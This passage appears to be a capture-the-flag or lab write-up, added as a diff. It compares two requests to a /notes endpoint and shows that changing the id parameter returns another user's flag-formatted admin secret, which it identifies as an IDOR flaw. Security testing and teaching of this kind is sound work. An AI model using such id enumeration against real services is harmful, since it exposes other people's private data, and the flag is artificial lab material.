@@ -1,0 +1,20 @@
+**GET /notes?id=1**
+```json
+{"id": "1", "note": "alice-note", "viewer": null}
+```
+
+**GET /notes?id=2**
+```json
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+```
+
+**Differences**
+
+| field | id=1 | id=2 |
+|---|---|---|
+| `id` | `"1"` | `"2"` |
+| `note` | `alice-note` | `admin-secret-FLAG{idor_user2}` |
+| `viewer` | `null` | `null` (same) |
+
+- Only `id` and `note` differ; `viewer` is `null` in both responses.
+- Note 2's content is a privileged-looking secret (flag-formatted), and it was returned to this unauthenticated request without any access check — i.e. the endpoint serves arbitrary users' notes by raw `id`, an **IDOR / broken object-level authorization** condition. HTTP status/body shape were otherwise identical for both requests.
